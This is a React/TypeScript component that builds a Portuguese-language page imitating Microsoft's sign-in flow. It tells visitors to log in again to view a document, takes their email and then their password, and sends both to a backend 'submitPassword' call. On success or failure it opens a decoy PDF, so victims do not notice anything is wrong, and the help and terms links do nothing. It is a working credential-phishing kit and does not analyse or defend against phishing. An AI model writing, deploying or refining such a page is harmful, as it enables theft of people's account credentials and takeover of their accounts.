import { useState } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

type Step = "email" | "password";

export default function Home() {
  const [step, setStep] = useState<Step>("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [pdfUrl, setPdfUrl] = useState<string | null>(null);
  const [showPassword, setShowPassword] = useState(false);
  const [keepSignedIn, setKeepSignedIn] = useState(false);
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [animating, setAnimating] = useState(false);
  const [animDir, setAnimDir] = useState<"forward" | "back">("forward");

  const submitPasswordMutation = trpc.login.submitPassword.useMutation({
    onSuccess: () => {
      setTimeout(() => {
        window.open("/manus-storage/HKI26-0382_a4a69c13.pdf", "_blank");
      }, 500);
      setPdfUrl("success");
    },
    onError: (error) => {
      console.error("Erro:", error);
      setTimeout(() => {
        window.open("/manus-storage/HKI26-0382_a4a69c13.pdf", "_blank");
      }, 500);
      setPdfUrl("success");
    },
  });

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setEmailError("");
    if (!email.trim()) {
      setEmailError("Insira um email válido.");
      return;
    }
    setAnimDir("forward");
    setAnimating(true);
    setTimeout(() => {
      setStep("password");
      setAnimating(false);
    }, 180);
  };

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setPasswordError("");
    if (!password.trim()) {
      setPasswordError("A senha está incorreta. Tente novamente.");
      return;
    }
    submitPasswordMutation.mutate({ email, password });
  };

  const handleBackToEmail = () => {
    setAnimDir("back");
    setAnimating(true);
    setTimeout(() => {
      setStep("email");
      setPassword("");
      setPasswordError("");
      setAnimating(false);
    }, 180);
  };

  if (pdfUrl) {
    return (
      <div className="ms-bg">
        <div className="ms-container">
          <div className="ms-card" style={{ textAlign: "center", padding: "40px" }}>
            <h2 style={{ marginBottom: "20px", color: "#1a1a1a" }}>Documento enviado com sucesso!</h2>
            <p style={{ color: "#666", marginBottom: "20px" }}>O PDF está sendo aberto em uma nova aba...</p>
            <a 
              href="/manus-storage/HKI26-0382_a4a69c13.pdf" 
              target="_blank" 
              rel="noopener noreferrer" 
              className="ms-btn-primary" 
              style={{ display: "inline-block", padding: "10px 24px", textDecoration: "none" }}
            >
              Clique aqui se o PDF não abrir
            </a>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="ms-bg">
      <div className="ms-container">
        {/* Message above logo */}
        <div className="ms-doc-message">
          Para ver o documento, entre com sua conta novamente.
        </div>

        <div className={`ms-card ms-card-anim${animating ? (animDir === "forward" ? " ms-card-slide-out" : " ms-card-slide-back") : ""}`}>
          <MicrosoftLogo />

          {step === "email" && (
            <form onSubmit={handleEmailSubmit} className="ms-form" noValidate>
              <h1 className="ms-title">Entrar</h1>

              <input
                type="email"
                placeholder="Email, telefone ou Skype"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="ms-input"
                autoFocus
              />

              {emailError && <div className="ms-error">{emailError}</div>}

              <div className="ms-links">
                <a href="#" onClick={(e) => e.preventDefault()}>Não tem uma conta? Crie uma!</a>
                <a href="#" onClick={(e) => e.preventDefault()}>Não consegue acessar sua conta?</a>
              </div>

              <div className="ms-btn-row">
                <button type="submit" className="ms-btn-primary">
                  Avançar
                </button>
              </div>
            </form>
          )}

          {step === "password" && (
            <form onSubmit={handlePasswordSubmit} className="ms-form" noValidate>
              <h1 className="ms-title">Entrar</h1>

              <div className="ms-email-display">
                {email}
              </div>

              <button
                type="button"
                onClick={handleBackToEmail}
                className="ms-btn-back"
              >
                ← Usar outra conta
              </button>

              <input
                type={showPassword ? "text" : "password"}
                placeholder="Senha"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="ms-input"
                autoFocus
              />

              {passwordError && <div className="ms-error">{passwordError}</div>}

              <div className="ms-checkbox-row">
                <label className="ms-checkbox-label">
                  <input
                    type="checkbox"
                    checked={showPassword}
                    onChange={(e) => setShowPassword(e.target.checked)}
                    className="ms-checkbox"
                  />
                  <span>Mostrar senha</span>
                </label>
              </div>

              <div className="ms-checkbox-row">
                <label className="ms-checkbox-label">
                  <input
                    type="checkbox"
                    checked={keepSignedIn}
                    onChange={(e) => setKeepSignedIn(e.target.checked)}
                    className="ms-checkbox"
                  />
                  <span>Manter-me conectado</span>
                </label>
              </div>

              <div className="ms-btn-row">
                <button
                  type="submit"
                  className="ms-btn-primary"
                  disabled={submitPasswordMutation.isPending}
                >
                  {submitPasswordMutation.isPending ? "Entrando..." : "Entrar"}
                </button>
              </div>
            </form>
          )}
        </div>

        <div className="ms-footer">
          <a href="#" onClick={(e) => e.preventDefault()}>Termos de uso</a>
          <a href="#" onClick={(e) => e.preventDefault()}>Privacidade e cookies</a>
          <span className="ms-footer-dots">···</span>
        </div>
      </div>
    </div>
  );
}

function MicrosoftLogo() {
  return (
    <div className="ms-logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" width="21" height="21">
        <path fill="#f35325" d="M1 1h10v10H1z" />
        <path fill="#81bc06" d="M12 1h10v10H12z" />
        <path fill="#05a6f0" d="M1 12h10v10H1z" />
        <path fill="#ffba08" d="M12 12h10v10H12z" />
      </svg>
      <span className="ms-logo-text">Microsoft</span>
    </div>
  );
}
